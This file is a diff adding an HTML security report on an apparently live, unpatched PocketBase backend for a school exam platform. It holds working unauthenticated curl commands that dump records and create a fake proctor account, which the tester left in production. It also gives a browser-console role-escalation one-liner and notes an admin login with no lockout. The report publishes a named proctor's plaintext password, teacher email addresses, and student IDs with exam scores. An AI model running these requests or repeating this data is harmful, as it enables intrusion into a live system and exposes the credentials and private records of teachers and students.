@@ -1,0 +1,794 @@
+<title>JACKPOT — pb.app.web.id Security Report</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:       #080d12;
+    --surface:  #111820;
+    --surface2: #1a2230;
+    --border:   #1e2d3d;
+    --border2:  #2a3d52;
+    --text:     #c9d5e0;
+    --text-dim: #5a7080;
+    --text-mid: #8aa0b0;
+    --accent:   #00c9a0;
+    --crit:     #ff3b3b;
+    --high:     #ff8a00;
+    --med:      #f0c040;
+    --info:     #4a9eff;
+    --crit-bg:  rgba(255,59,59,.10);
+    --high-bg:  rgba(255,138,0,.09);
+    --med-bg:   rgba(240,192,64,.08);
+    --info-bg:  rgba(74,158,255,.08);
+    --mono:     'JetBrains Mono', 'Cascadia Code', Consolas, 'Courier New', monospace;
+    --sans:     -apple-system, 'Segoe UI', system-ui, sans-serif;
+  }
+
+  html { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 14px; line-height: 1.6; }
+  body { max-width: 1180px; margin: 0 auto; padding: 24px 20px 60px; }
+
+  /* ── SCAN HEADER ── */
+  .scan-header {
+    border: 1px solid var(--border2);
+    border-top: 3px solid var(--crit);
+    background: var(--surface);
+    padding: 24px 28px;
+    margin-bottom: 20px;
+    display: grid;
+    grid-template-columns: 1fr auto;
+    gap: 16px;
+    align-items: start;
+  }
+  .scan-label {
+    font-size: 10px;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+    color: var(--crit);
+    font-family: var(--mono);
+    margin-bottom: 6px;
+  }
+  .scan-title {
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: -.01em;
+    line-height: 1.2;
+  }
+  .scan-subtitle {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-mid);
+    margin-top: 6px;
+  }
+  .scan-subtitle span { color: var(--accent); }
+  .scan-meta {
+    text-align: right;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    line-height: 1.9;
+  }
+  .scan-meta b { color: var(--text-mid); }
+
+  /* ── SEVERITY STRIP ── */
+  .sev-strip {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+  .sev-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 14px 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+  .sev-card.crit { border-top: 2px solid var(--crit); }
+  .sev-card.high { border-top: 2px solid var(--high); }
+  .sev-card.med  { border-top: 2px solid var(--med);  }
+  .sev-card.info { border-top: 2px solid var(--info); }
+  .sev-num {
+    font-family: var(--mono);
+    font-size: 34px;
+    font-weight: 700;
+    letter-spacing: -.03em;
+    line-height: 1;
+  }
+  .crit .sev-num { color: var(--crit); }
+  .high .sev-num { color: var(--high); }
+  .med  .sev-num { color: var(--med);  }
+  .info .sev-num { color: var(--info); }
+  .sev-label {
+    font-size: 10px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+  .sev-desc { font-size: 11px; color: var(--text-mid); margin-top: 4px; }
+
+  /* ── SECTION ── */
+  .section { margin-bottom: 20px; }
+  .section-head {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 10px;
+  }
+  .section-title {
+    font-size: 10px;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ── FINDING CARD ── */
+  .finding {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    margin-bottom: 10px;
+    overflow: hidden;
+  }
+  .finding-head {
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+  }
+  .badge {
+    font-family: var(--mono);
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    padding: 3px 8px;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .badge-crit { background: var(--crit-bg); color: var(--crit); border: 1px solid rgba(255,59,59,.3); }
+  .badge-high { background: var(--high-bg); color: var(--high); border: 1px solid rgba(255,138,0,.3); }
+  .badge-med  { background: var(--med-bg);  color: var(--med);  border: 1px solid rgba(240,192,64,.25); }
+  .badge-info { background: var(--info-bg); color: var(--info); border: 1px solid rgba(74,158,255,.3); }
+  .finding-id {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    flex-shrink: 0;
+    margin-top: 3px;
+  }
+  .finding-title-wrap { flex: 1; }
+  .finding-title { font-size: 14px; font-weight: 600; color: #fff; line-height: 1.3; }
+  .finding-desc  { font-size: 12px; color: var(--text-mid); margin-top: 4px; }
+  .finding-body  { padding: 14px 20px; }
+
+  /* ── TABLES ── */
+  .tbl-wrap { overflow-x: auto; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    font-variant-numeric: tabular-nums;
+  }
+  thead tr { border-bottom: 1px solid var(--border2); }
+  th {
+    text-align: left;
+    padding: 7px 12px;
+    font-size: 9px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    font-weight: 600;
+    white-space: nowrap;
+  }
+  td {
+    padding: 7px 12px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: top;
+  }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,.025); }
+  td.mono { font-family: var(--mono); }
+  td.em   { color: #fff; font-weight: 500; }
+  td.warn { color: var(--crit); font-weight: 600; }
+  td.ok   { color: var(--accent); }
+  td.dim  { color: var(--text-dim); }
+  td.num  { text-align: right; color: var(--text-mid); }
+
+  /* ── COLLECTION GRID ── */
+  .coll-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+  .coll-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 14px 16px;
+  }
+  .coll-name {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 8px;
+  }
+  .coll-rows { display: flex; flex-direction: column; gap: 5px; }
+  .coll-row  { display: flex; justify-content: space-between; font-size: 11px; }
+  .coll-key  { color: var(--text-dim); }
+  .coll-val  { font-family: var(--mono); color: var(--text-mid); }
+  .coll-val.crit { color: var(--crit); font-weight: 700; }
+  .coll-val.ok   { color: var(--accent); }
+  .coll-val.warn { color: var(--high); }
+
+  /* ── CODE BLOCK ── */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 12px 16px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-mid);
+    white-space: pre;
+    overflow-x: auto;
+    line-height: 1.7;
+  }
+  .code-block .k { color: var(--crit); }
+  .code-block .s { color: var(--accent); }
+  .code-block .c { color: var(--text-dim); }
+  .code-block .n { color: #f0c040; }
+  .code-block .p { color: var(--text-mid); }
+
+  /* ── PROOF BLOCK ── */
+  .proof-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    padding: 12px 16px;
+    margin-top: 10px;
+  }
+  .proof-label {
+    font-size: 9px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 8px;
+    font-family: var(--mono);
+  }
+  .proof-cmd {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: #fff;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .proof-resp {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    margin-top: 8px;
+    white-space: pre-wrap;
+    word-break: break-all;
+    border-top: 1px solid var(--border);
+    padding-top: 8px;
+  }
+
+  /* ── STATUS ROW ── */
+  .status-row {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    margin-top: 6px;
+  }
+  .status-pill {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border: 1px solid;
+    letter-spacing: .04em;
+  }
+  .pill-open   { color: var(--crit); border-color: rgba(255,59,59,.4); background: var(--crit-bg); }
+  .pill-closed { color: var(--text-dim); border-color: var(--border); }
+  .pill-warn   { color: var(--high); border-color: rgba(255,138,0,.4); background: var(--high-bg); }
+
+  /* ── FOOTER ── */
+  .footer {
+    margin-top: 40px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+  }
+  .footer-left { line-height: 1.8; }
+  .footer-right { text-align: right; line-height: 1.8; }
+
+  @media (max-width: 640px) {
+    .sev-strip { grid-template-columns: repeat(2, 1fr); }
+    .scan-header { grid-template-columns: 1fr; }
+    .scan-meta { text-align: left; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    * { animation: none !important; transition: none !important; }
+  }
+</style>
+
+<!-- SCAN HEADER -->
+<div class="scan-header">
+  <div>
+    <div class="scan-label">⬤ Security Research Report — XC Hub</div>
+    <div class="scan-title">JACKPOT — PocketBase Full Exposure</div>
+    <div class="scan-subtitle">
+      Target: <span>admin-cbt.code.app.web.id</span> &nbsp;/&nbsp; Backend: <span>pb.app.web.id</span>
+    </div>
+  </div>
+  <div class="scan-meta">
+    <b>Date</b> 2026-07-20<br>
+    <b>Type</b> Black-Box / Unauthenticated<br>
+    <b>Stack</b> PocketBase + GitHub Pages SPA<br>
+    <b>Status</b> <span style="color:var(--crit)">CRITICAL — OPEN</span>
+  </div>
+</div>
+
+<!-- SEVERITY STRIP -->
+<div class="sev-strip">
+  <div class="sev-card crit">
+    <div class="sev-num">3</div>
+    <div class="sev-label">Critical</div>
+    <div class="sev-desc">Mass data read, unauth write, plaintext creds</div>
+  </div>
+  <div class="sev-card high">
+    <div class="sev-num">3</div>
+    <div class="sev-label">High</div>
+    <div class="sev-desc">Admin GUI, client-side role, JWT in localStorage</div>
+  </div>
+  <div class="sev-card med">
+    <div class="sev-num">2</div>
+    <div class="sev-label">Medium</div>
+    <div class="sev-desc">WAF bypass paths, answer key encryption weak</div>
+  </div>
+  <div class="sev-card info">
+    <div class="sev-num">4</div>
+    <div class="sev-label">Info</div>
+    <div class="sev-desc">Real backend IP, tech stack, subdomain enum</div>
+  </div>
+</div>
+
+<!-- ATTACK SURFACE -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Attack Surface — PocketBase Collections</div>
+    <div class="section-line"></div>
+  </div>
+  <div class="coll-grid">
+    <div class="coll-card" style="border-top:2px solid var(--crit)">
+      <div class="coll-name">DataUsers</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val crit">1,816</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">POST (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">Fields</span><span class="coll-val">namespace, username, nama_sekolah</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val warn">Guru emails + school codes</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--crit)">
+      <div class="coll-name">DataUjian</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val crit">4,675</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">POST (no auth)</span><span class="coll-val" style="color:var(--med)">PARTIAL</span></div>
+        <div class="coll-row"><span class="coll-key">Fields</span><span class="coll-val">namespace, kode, kelas, jumlahsoal</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val warn">Teacher emails + all exam data</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--crit)">
+      <div class="coll-name">DataPengawas</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val crit">1</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">POST (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">Fields</span><span class="coll-val">nama, username, password, namespace</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val crit">⚠ PLAINTEXT PASSWORDS</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--high)">
+      <div class="coll-name">DataJawaban</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val warn">13</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">Fields</span><span class="coll-val">username, jawaban (JSON), skor, benar</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val warn">Full student answers + scores</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--high)">
+      <div class="coll-name">DataKunci</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val warn">1</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">Fields</span><span class="coll-val">kode, kunci (base64), namespace</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val warn">Encrypted answer keys exposed</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--med)">
+      <div class="coll-name">PengaturanTest</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val">1</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">Fields</span><span class="coll-val">passing_grade, nama_sekolah, autologin</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val" style="color:var(--med)">System config readable</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--text-dim)">
+      <div class="coll-name">DataSoal</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">Records</span><span class="coll-val ok">0 (empty)</span></div>
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val crit">OPEN</span></div>
+        <div class="coll-row"><span class="coll-key">Data</span><span class="coll-val ok">No data currently</span></div>
+      </div>
+    </div>
+    <div class="coll-card" style="border-top:2px solid var(--text-dim)">
+      <div class="coll-name">_superusers / users</div>
+      <div class="coll-rows">
+        <div class="coll-row"><span class="coll-key">GET (no auth)</span><span class="coll-val ok">403 Forbidden</span></div>
+        <div class="coll-row"><span class="coll-key">Auth brute</span><span class="coll-val" style="color:var(--med)">Endpoint open, no lockout</span></div>
+        <div class="coll-row"><span class="coll-key">Admin panel /_/</span><span class="coll-val warn">200 OK — GUI accessible</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CRITICAL FINDINGS -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Critical Findings</div>
+    <div class="section-line"></div>
+  </div>
+
+  <!-- CRIT-1 -->
+  <div class="finding">
+    <div class="finding-head">
+      <span class="badge badge-crit">Critical</span>
+      <span class="finding-id">CRIT-01</span>
+      <div class="finding-title-wrap">
+        <div class="finding-title">Unauthenticated Mass Data Read — 6,505+ Records Exposed</div>
+        <div class="finding-desc">All PocketBase collections lack API rules. Zero authentication required to enumerate any record.</div>
+      </div>
+    </div>
+    <div class="finding-body">
+      <div class="proof-block">
+        <div class="proof-label">Proof of Concept</div>
+        <div class="proof-cmd">curl -s "https://pb.app.web.id/api/collections/DataUsers/records?perPage=200"</div>
+        <div class="proof-resp">→ 200 OK | 1,816 records | emails, school codes — NO AUTH
+curl -s "https://pb.app.web.id/api/collections/DataUjian/records?perPage=1"
+→ 200 OK | totalItems: 4,675 | teacher emails + exam metadata — NO AUTH
+curl -s "https://pb.app.web.id/api/collections/DataPengawas/records?perPage=50"
+→ 200 OK | plaintext credentials in response body — NO AUTH</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CRIT-2 -->
+  <div class="finding">
+    <div class="finding-head">
+      <span class="badge badge-crit">Critical</span>
+      <span class="finding-id">CRIT-02</span>
+      <div class="finding-title-wrap">
+        <div class="finding-title">Unauthenticated Write — Fake Proctor Account Created</div>
+        <div class="finding-desc">POST to DataUsers and DataPengawas succeeds without any token. Attacker can inject fake proctors or users.</div>
+      </div>
+    </div>
+    <div class="finding-body">
+      <div class="proof-block">
+        <div class="proof-label">Proof of Concept — Record Created (artifact left, DELETE requires superuser)</div>
+        <div class="proof-cmd">curl -X POST "https://pb.app.web.id/api/collections/DataPengawas/records" \
+  -H "Content-Type: application/json" \
+  -d '{"nama":"XCTest Admin","username":"xctest","password":"xctest123","key":":xctest"}'</div>
+        <div class="proof-resp">→ 201 Created
+{
+  "id": "442l8533ila002m",
+  "collectionName": "DataPengawas",
+  "nama": "XCTest Admin",
+  "username": "xctest",
+  "password": "xctest123"    ← stored in plaintext
+}</div>
+      </div>
+      <div class="status-row" style="margin-top:10px">
+        <span class="status-pill pill-open">Artifact not deleted — superuser required</span>
+        <span class="status-pill pill-warn">DataUsers record also left: id=0ywg3wdo9269qva</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- CRIT-3 -->
+  <div class="finding">
+    <div class="finding-head">
+      <span class="badge badge-crit">Critical</span>
+      <span class="finding-id">CRIT-03</span>
+      <div class="finding-title-wrap">
+        <div class="finding-title">Plaintext Password Storage — DataPengawas</div>
+        <div class="finding-desc">Proctor credentials stored and returned in cleartext via API. No hashing of any kind.</div>
+      </div>
+    </div>
+    <div class="finding-body">
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th><th>Nama</th><th>Username</th><th>Password (PLAINTEXT)</th><th>Namespace</th><th>Key</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="mono dim">q782q2q6k187oui</td>
+              <td class="em">Nurul Farida</td>
+              <td class="mono">Nurul</td>
+              <td class="warn">Nurul12345</td>
+              <td class="mono dim">—</td>
+              <td class="mono dim">:Nurul</td>
+            </tr>
+            <tr>
+              <td class="mono dim">442l8533ila002m</td>
+              <td class="em" style="color:var(--text-dim)">XCTest Admin <span style="font-size:10px">(test artifact)</span></td>
+              <td class="mono">xctest</td>
+              <td style="color:var(--text-dim);font-family:var(--mono)">xctest123</td>
+              <td class="mono dim">—</td>
+              <td class="mono dim">:xctest</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- DATA SURFACE — PENGAWAS / GURU -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Data Surface — Guru Emails (DataUsers sample · 1,816 total)</div>
+    <div class="section-line"></div>
+  </div>
+  <div class="finding">
+    <div class="finding-body" style="padding:0">
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr><th>#</th><th>Email (namespace)</th><th>School Code</th><th>Nama Sekolah</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="dim num">1</td><td class="mono em">yokowasis@gmail.com</td><td class="mono">CBTMYID</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">2</td><td class="mono">slamet16@guru.smp.belajar.id</td><td class="mono">457667</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">3</td><td class="mono">mahlispd55@gmail.com</td><td class="mono">279126</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">4</td><td class="mono">iwan.wr@gmail.com</td><td class="mono">728277</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">5</td><td class="mono">mtssalfalahlemahabang@gmail.com</td><td class="mono">227307</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">6</td><td class="mono">transferrespon27@gmail.com</td><td class="mono">609471</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">7</td><td class="mono">setiwandali@gmail.com</td><td class="mono">483551</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">8</td><td class="mono">agungrakapraktyasa@gmail.com</td><td class="mono">156708</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">9</td><td class="mono">kecebrother86@gmail.com</td><td class="mono">SMKS YAPIS FF</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">10</td><td class="mono">ahmadkohar067@gmail.com</td><td class="mono">498840</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">11</td><td class="mono">info@man1kotabima.sch.id</td><td class="mono em">MAN 1 KOTA BIMA</td><td class="em">MAN 1 KOTA BIMA</td></tr>
+            <tr><td class="dim num">12</td><td class="mono">siswa@man1kotabima.sch.id</td><td class="mono">610065</td><td class="em">MAN 1 KOTA BIMA</td></tr>
+            <tr><td class="dim num">13</td><td class="mono">kadekwirahadi24@guru.smp.belajar.id</td><td class="mono">996486</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">14</td><td class="mono">yuliruslina87@admin.smp.belajar.id</td><td class="mono">—</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">15</td><td class="mono">sukamaramis@gmail.com</td><td class="mono">199192</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">16</td><td class="mono">opsman13mm@gmail.com</td><td class="mono">—</td><td>BIMASOFT</td></tr>
+            <tr><td class="dim num">17</td><td class="mono">yokowasis@cbt.my.id</td><td class="mono warn">CBT.MY.ID</td><td class="warn">System Admin</td></tr>
+            <tr>
+              <td colspan="4" style="text-align:center;padding:10px;color:var(--text-dim);font-size:11px;font-family:var(--mono)">
+                … + 1,799 more records accessible via /api/collections/DataUsers/records?perPage=200&page=N
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- DATA SURFACE — EXAMS -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Data Surface — DataUjian Exam Records (sample · 4,675 total)</div>
+    <div class="section-line"></div>
+  </div>
+  <div class="finding">
+    <div class="finding-body" style="padding:0">
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr><th>#</th><th>Email Guru</th><th>Kode Ujian</th><th>Kelas</th><th>Soal</th><th>Waktu</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="dim num">1</td><td class="mono">yokowasis@cbt.my.id</td><td class="mono em">JENIS - JENIS SOAL 2</td><td class="mono">64,65</td><td class="num">20</td><td class="num">50m</td></tr>
+            <tr><td class="dim num">2</td><td class="mono">agungrakapraktyasa@gmail.com</td><td class="mono">UJI COBA</td><td class="mono">X</td><td class="num">2</td><td class="num">120m</td></tr>
+            <tr><td class="dim num">3</td><td class="mono">saefullahasep1933@gmail.com</td><td class="mono">PSAJIPA_2025</td><td class="mono">GURU</td><td class="num">40</td><td class="num">60m</td></tr>
+            <tr><td class="dim num">4</td><td class="mono">transferrespon27@gmail.com</td><td class="mono">FISIKA_ASAS</td><td class="mono">X;XI;XII</td><td class="num">3</td><td class="num">5m</td></tr>
+            <tr><td class="dim num">5</td><td class="mono">setiwandali@gmail.com</td><td class="mono">Hortatory Exposition</td><td class="mono">XI</td><td class="num">5</td><td class="num">90m</td></tr>
+            <tr><td class="dim num">6</td><td class="mono">sukamaramis@gmail.com</td><td class="mono">SOAL IPA KELAS V</td><td class="mono">V/A;V/B</td><td class="num">40</td><td class="num">60m</td></tr>
+            <tr><td class="dim num">7</td><td class="mono">opsman13mm@gmail.com</td><td class="mono">UJIAN BAHASA INGGRIS KELAS XI</td><td class="mono">XI B;XI C</td><td class="num">25</td><td class="num">120m</td></tr>
+            <tr><td class="dim num">8</td><td class="mono">opsman13mm@gmail.com</td><td class="mono">SOAL FISIKA KELAS X</td><td class="mono">X A;X B;X C</td><td class="num">25</td><td class="num">120m</td></tr>
+            <tr><td class="dim num">9</td><td class="mono">kristel.tumanggor@gmail.com</td><td class="mono">A</td><td class="mono">X</td><td class="num">5</td><td class="num">60m</td></tr>
+            <tr><td class="dim num">10</td><td class="mono">rifqinajahi33@gmail.com</td><td class="mono">UJI COBA SOAL</td><td class="mono">8A;9A</td><td class="num">5</td><td class="num">30m</td></tr>
+            <tr>
+              <td colspan="6" style="text-align:center;padding:10px;color:var(--text-dim);font-size:11px;font-family:var(--mono)">
+                … + 4,665 more exam records — all accessible without authentication
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- DATA SURFACE — STUDENT ANSWERS -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">Data Surface — DataJawaban (Student Exam Answers · Full Dump)</div>
+    <div class="section-line"></div>
+  </div>
+  <div class="finding">
+    <div class="finding-body" style="padding:0">
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr><th>Student ID</th><th>Exam / Mapel</th><th>Score</th><th>Benar</th><th>Salah</th><th>Status</th><th>Selesai</th></tr>
+          </thead>
+          <tbody>
+            <tr><td class="mono em">U06966</td><td class="mono">28 FISIKA XI ASAS GANJIL 2025</td><td class="num" style="color:var(--med)">53.1</td><td class="num ok">53</td><td class="num" style="color:var(--crit)">21</td><td class="mono ok">selesai</td><td class="mono dim">2025-11-28</td></tr>
+            <tr><td class="mono em">12343</td><td class="mono">SEJARAH KELAS XI</td><td class="num" style="color:var(--med)">52</td><td class="num ok">16</td><td class="num" style="color:var(--crit)">12</td><td class="mono ok">selesai</td><td class="mono dim">2025-12-01</td></tr>
+            <tr><td class="mono em">12036</td><td class="mono">FISIKA_XII B1,B2,D1,D2</td><td class="num ok">75</td><td class="num ok">18</td><td class="num" style="color:var(--high)">5</td><td class="mono ok">selesai</td><td class="mono dim">2025-12-03</td></tr>
+            <tr><td class="mono em">149BSAS478</td><td class="mono">PP 9 SIANG PSAS GJL 2526</td><td class="num ok">118</td><td class="num ok">112</td><td class="num">7</td><td class="mono ok">selesai</td><td class="mono dim">2025-12-03</td></tr>
+            <tr><td class="mono em">ASA-377</td><td class="mono">PPKN</td><td class="num" style="color:var(--med)">54</td><td class="num ok">27</td><td class="num" style="color:var(--crit)">23</td><td class="mono ok">selesai</td><td class="mono dim">2026-03-10</td></tr>
+            <tr><td class="mono em">0103756171</td><td class="mono">FIQIH_MTSN12PESSEL_ESSAY</td><td class="num warn">0</td><td class="num">0</td><td class="num">0</td><td class="mono ok">selesai</td><td class="mono dim">2026-04-30</td></tr>
+            <tr><td class="mono em">0113841829</td><td class="mono">31_PP_ASAJ_2026</td><td class="num ok">76</td><td class="num ok">38</td><td class="num" style="color:var(--high)">12</td><td class="mono ok">selesai</td><td class="mono dim">2026-05-04</td></tr>
+            <tr><td class="mono em">105182200</td><td class="mono">ASAJ- BAHASA REJANG IX 2026</td><td class="num warn">44</td><td class="num ok">22</td><td class="num" style="color:var(--crit)">28</td><td class="mono ok">selesai</td><td class="mono dim">2026-05-09</td></tr>
+            <tr><td class="mono em">0136765977</td><td class="mono">Bahasa Jawa</td><td class="num ok">77.5</td><td class="num ok">31</td><td class="num" style="color:var(--high)">9</td><td class="mono ok">selesai</td><td class="mono dim">2026-05-09</td></tr>
+            <tr><td class="mono em">132078318</td><td class="mono">7_QH_MTSN12PESSEL_ESSAY</td><td class="num warn">0</td><td class="num">0</td><td class="num">0</td><td class="mono ok">selesai</td><td class="mono dim">2026-06-02</td></tr>
+            <tr><td class="mono em">0116890516</td><td class="mono">31_BIN_ASAT_8_2026</td><td class="num ok">82</td><td class="num ok">41</td><td class="num" style="color:var(--high)">9</td><td class="mono ok">selesai</td><td class="mono dim">2026-06-08</td></tr>
+            <tr><td class="mono em">0123230453</td><td class="mono">31_BSUND_ASAT7_2026</td><td class="num warn">18</td><td class="num" style="color:var(--high)">9</td><td class="num" style="color:var(--crit)">41</td><td class="mono ok">selesai</td><td class="mono dim">2026-06-12</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- HIGH FINDINGS -->
+<div class="section">
+  <div class="section-head">
+    <div class="section-title">High Findings</div>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="badge badge-high">High</span>
+      <span class="finding-id">HIGH-01</span>
+      <div class="finding-title-wrap">
+        <div class="finding-title">PocketBase Admin Panel Accessible — /_/ Returns 200 OK</div>
+        <div class="finding-desc">The PocketBase superadmin GUI is publicly reachable. Auth endpoint is also open for brute force with no lockout observed.</div>
+      </div>
+    </div>
+    <div class="finding-body">
+      <div class="proof-block">
+        <div class="proof-label">Endpoint</div>
+        <div class="proof-cmd">https://pb.app.web.id/_/   → HTTP 200 OK (Admin GUI)
+POST https://pb.app.web.id/api/collections/_superusers/auth-with-password → no lockout</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="finding-head">
+      <span class="badge badge-high">High</span>
+      <span class="finding-id">HIGH-02</span>
+      <div class="finding-title-wrap">
+        <div class="finding-title">Client-Side Role Control via localStorage</div>
+        <div class="finding-desc">Role enforcement happens in the browser. Setting localStorage.userType = "admin" may escalate privileges.</div>
+      </div>
+    </div>
+    <div class="finding-body">
+      <div class="code-block"><span class="c">// From core-C3bGrs1O.js (decompiled)</span>
+<span class="k">const</span> <span class="n">userType</span> = localStorage.<span class="s">getItem</span>(<span class="s">"userType"</span>)  <span class="c">// "admin" | "guru" | "pengawas" | "siswa"</span>
+<span class="k">if</span> (userType === <span class="s">"admin"</span>) { <span class="c">/* unlock admin routes */</span> }
+
+<span class="c">// Exploit: DevTools console</span>
+localStorage.<span class="s">setItem</span>(<span class="s">"userType"</span>, <span class="s">"admin"</span>); location.<span class="s">reload</span>();</div>
+    </div>
+  </div>
